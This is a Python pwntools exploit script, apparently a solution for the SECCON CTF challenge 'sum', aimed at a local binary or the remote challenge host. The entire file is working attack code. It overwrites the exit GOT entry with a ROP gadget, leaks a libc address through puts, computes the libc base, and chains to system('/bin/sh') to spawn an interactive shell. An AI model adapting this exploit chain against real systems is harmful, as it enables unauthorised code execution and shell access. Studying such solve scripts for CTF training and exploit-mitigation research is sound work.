#!/usr/bin/env python2

from pwn import *

BINARY = './sum'
HOST, PORT = 'sum.chal.seccon.jp', 10001

elf = ELF(BINARY)
libc = ELF('./libc-2.27.so')

def start():
	if not args.REMOTE:
		print "LOCAL PROCESS"
		return process(BINARY)
	else:
		print "REMOTE PROCESS"
		return remote(HOST, PORT)

def debug(breakpoints):
    script = "handle SIGALRM ignore\n"
    for bp in breakpoints:
        script += "b *0x%x\n"%(bp)
    gdb.attach(p,gdbscript=script)

def overwrite(src, dest):
	p.recv()
	p.sendline('{} -1 -1 1 1 {}'.format(dest - src, src))

context.terminal = ['tmux', 'new-window']

p = start()
if args.GDB:
	debug([0x40099d]) # 

printf_got = elf.got['printf']
exit_got = elf.got['exit']
puts_got = elf.got['puts']
main = elf.symbols['main']
puts = elf.plt['puts']
garbage = 0x601080
pop_rdi = 0x400a43
ret = 0x4005ee

# overwrite exit_got with pop rdi; ret
p.recv()
p.sendline('{} {} {} -1 +1 {}'.format(main, -main, pop_rdi - exit_got, exit_got))

# ROP to get libc leak
p.recv()
p.sendline('{} {} {} {} {} {}'.format(ret, pop_rdi, puts_got, puts, main, garbage))

# Remote binary behaves differently for whatever reason
if args.REMOTE:
	p.recvuntil('0\n')

leak = u64(p.recvline().strip('\n').ljust(8, '\x00'))
libc.address = leak - libc.symbols['puts']
system = libc.symbols['system']
bin_sh = next(libc.search('/bin/sh'))

log.info('Leak: ' + hex(leak))
log.info('Libc base: ' + hex(libc.address))
log.info('system: ' + hex(system))
log.info('/bin/sh: ' + hex(bin_sh))

# ROP to system('/bin/sh')
p.recv()
p.sendline('{} {} {} 1 1 {}'.format(pop_rdi, bin_sh, system, garbage))

p.interactive()